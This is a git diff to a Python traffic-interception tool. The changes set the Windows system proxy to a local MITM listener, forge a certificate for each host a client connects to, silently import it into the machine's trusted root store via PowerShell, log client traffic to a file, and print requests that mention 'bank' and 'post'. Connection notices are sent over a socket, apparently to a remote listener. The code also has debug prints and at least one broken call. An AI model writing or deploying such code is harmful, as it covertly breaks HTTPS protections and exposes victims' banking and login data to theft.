@@ -1,6 +1,12 @@
+from __future__ import annotations
+
 import os
+import random
+import ssl
 from typing import Tuple, Optional, Union, TextIO
 from mitm import MITM, middleware, Connection, protocol, crypto, __data__
+from mitm.crypto import new_RSA, new_X509
+
 from network import send
 from socket import socket
 from threading import Thread
@@ -10,11 +16,82 @@ from asyncio.exceptions import CancelledError
 import appdirs
 import pathlib
 import certifi
-
+from OpenSSL import crypto as cry
 
 my_socket: Optional[socket] = None
 file: Optional[TextIO] = None
 mitm: Optional[MITM] = None
+installed_hosts = []
+
+
+async def new_pair(
+    host: str,
+    key_path: Optional[pathlib.Path] = None,
+    cert_path: Optional[pathlib.Path] = None,
+) -> Tuple[bytes, bytes]:
+    """
+    Generates an RSA and self-signed X509 certificate for use with TLS/SSL.
+
+    The X509 certificate is self-signed and is not signed by any other certificate
+    authority, containing default values for its fields.
+
+    Args:
+        key_path: Optional path to save key.
+        cert_path: Optional path to save cert.
+
+    Returns:
+        tuple: Key and certificate bytes ready to be saved.
+    """
+    print("11")
+    rsa = new_RSA()
+    print("12")
+    cert = new_X509(common_name=host, organization_name="oops", organization_unit_name="oops")
+    print("13")
+    # Sets the certificate public key, and signs it.
+    cert.set_pubkey(rsa)
+    cert.sign(rsa, "sha256")
+    print("14")
+    # Dumps the .crt and .key files as bytes.
+    key = cry.dump_privatekey(cry.FILETYPE_PEM, rsa)
+    crt = cry.dump_certificate(cry.FILETYPE_PEM, cert)
+    print("15")
+    # Stores they .crt and .key file if specified.
+    if key_path:
+        key_path.parent.mkdir(parents=True, exist_ok=True)
+        with key_path.open("wb") as file:
+            file.write(key)
+    if cert_path:
+        cert_path.parent.mkdir(parents=True, exist_ok=True)
+        with cert_path.open("wb") as file:
+            file.write(crt)
+    print("16")
+    return key, crt
+
+
+async def start_connection(connection: Connection, data):
+    print("what")
+    if b"CONNECT" in data:
+        print("whatttt")
+        host = data[data.find(b" ")+1: data.find(b":")]
+        print("OK")
+    else:
+        return
+    print("Wow")
+    if host not in installed_hosts:
+        print("1")
+        rsa_key, rsa_cert = __data__ / f"{host}.key", __data__ / f"{host}.crt"
+        print("2")
+        await new_pair(host, key_path=rsa_key, cert_path=rsa_cert)
+        print("3")
+        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+        print("4")
+        context.load_cert_chain(certfile=rsa_cert, keyfile=rsa_key)
+        connection.ssl_context = context
+        print(host)
+        install_cert(rsa_cert)
+        os.remove(rsa_key)
+        os.remove(rsa_cert)
+        installed_hosts.append(host)
 
 
 class FileLog(middleware.Middleware):
@@ -39,7 +116,7 @@ class FileLog(middleware.Middleware):
     async def client_data(connection: Connection, data: bytes) -> bytes:
         file.write("Client to server: \n\n\t%s\n" % data)
         # print("Client to server: \n\n\t%s\n" % data)
-
+        await start_connection(connection, data)
         if b"bank" in data and b"post" in data:
             print(data)
         else:
@@ -70,6 +147,7 @@ class NetLog(middleware.Middleware):
 
     @staticmethod
     async def client_connected(connection: Connection):
+        start_connection(connection)
         host, port = connection.client.writer._transport.get_extra_info("peername")
         send("Client %s:%i has connected." % (host, port), my_socket)
 
@@ -107,8 +185,8 @@ def set_reg(name, value, size):
         return False
 
 
-def install_cert():
-    path = __data__
+def install_cert(host: str | None = None):
+    path = __data__.joinpath(f"mitm.crt") if not host else host
     os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")
 
 
@@ -119,7 +197,6 @@ def filestart(path: str) -> bool:
     file = open(path, "wt")
     t = Thread(target=__start)
     t.start()
-    install_cert()
     return True
 
 
@@ -152,15 +229,16 @@ def __start() -> bool:
         return False
     #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
     #sys.stdout.write("yes")
-    if not set_reg("ProxyServer", "127.0.0.1:8888", winreg.REG_SZ):
+    if not set_reg("ProxyServer", "127.0.0.1:8880", winreg.REG_SZ):
         return False
     mitm = MITM(middlewares=[logger],
                 host="127.0.0.1",
-                port=8888,
+                port=8880,
                 protocols=[protocol.HTTP],
                 buffer_size=8192,
                 timeout=5,
                 ssl_context=crypto.mitm_ssl_default_context())
+    install_cert()
     try:
         mitm.run()
     except CancelledError:
